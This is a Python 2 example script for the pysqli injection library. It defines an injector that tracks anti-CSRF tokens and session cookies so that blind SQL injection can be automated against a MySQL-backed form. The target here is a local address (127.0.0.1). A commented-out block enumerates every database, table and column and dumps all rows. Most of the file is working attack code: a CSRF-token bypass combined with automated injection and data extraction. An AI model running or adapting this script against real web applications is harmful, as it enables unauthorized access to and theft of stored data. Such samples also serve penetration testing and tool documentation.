import re
from pysqli import Context
from pysqli.dbms import Mysql5
from pysqli.core.injector import PostInjector
from pysqli.core.triggers import RegexpTrigger, Trigger
from urllib2 import Request,urlopen
from threading import Lock 

class CSRFPostInjector(PostInjector):
    '''
    This is a sample of an injector able to track anti-CSRF tokens.

    This injector must use Lock to ensure token integrity between
    a call to process_injection() and process_response().
    '''
    def __init__(self, context):
        PostInjector.__init__(self, context)
        self._lock = Lock()
        self.get_token_sid()
        self.set_trigger(RegexpTrigger(['(inexistant)'],mode=Trigger.MODE_ERROR))
        self.get_context().set_cookie('PHPSESSID=%s;' % self._sid)
    
    def get_token_sid(self):
        '''
        Extract a valid token and the corresponding PHPSESSID.
        '''
        r = Request(self.get_context().get_url())
        resp = urlopen(r)
        content = resp.read()
        self._token = re.search('name="token" value="([^"]+)"', content).group(1)
        self._sid = re.search('PHPSESSID=([0-9a-zA-Z]+);', resp.headers['set-cookie']).group(1)

    def inject(self, sql):
        print sql
        return super(CSRFPostInjector, self).inject(sql)

    def process_injection(self, parameters):
        '''
        Injection hook. 
        
        Acquire the lock, inject token into tampered parameters, and forward to parent.
        '''
        self._lock.acquire()
        parameters['token'] = self._token
        return super(CSRFPostInjector, self).process_injection(parameters)

    def process_response(self, response):
        '''
        Process response

        Extract token, release the lock.
        '''
        self._token = re.search('name="token" value="([^"]+)"', response.get_content()).group(1)
        res = super(CSRFPostInjector, self).process_response(response)
        self._lock.release()
        #print response.get_content()
        print res
        return res

# Injection context as discovered manually
c = Context(
	method='blind',
	comment='#',
	field_type=Context.FIELD_INT,
	url="http://127.0.0.1/",
    params={
        'id':'1',
        'token':'',
    },
	target='id',
)

# DBMS abstraction
m = Mysql5.custom(CSRFPostInjector,c)

print '[i] Version: %s' % m.get_int("LENGTH('test')")

"""
for db in m.databases():
    if str(db) not in ['information_schema','mysql']:
        print '=> %s' % db
        for table in db.tables():
            print '---> %s' % table
            for field in table.fields():
                print '      + %s' % field

for table in m.database().tables():
    print 'Dump %s ...' % table
    for row in table.all():
        print row
"""
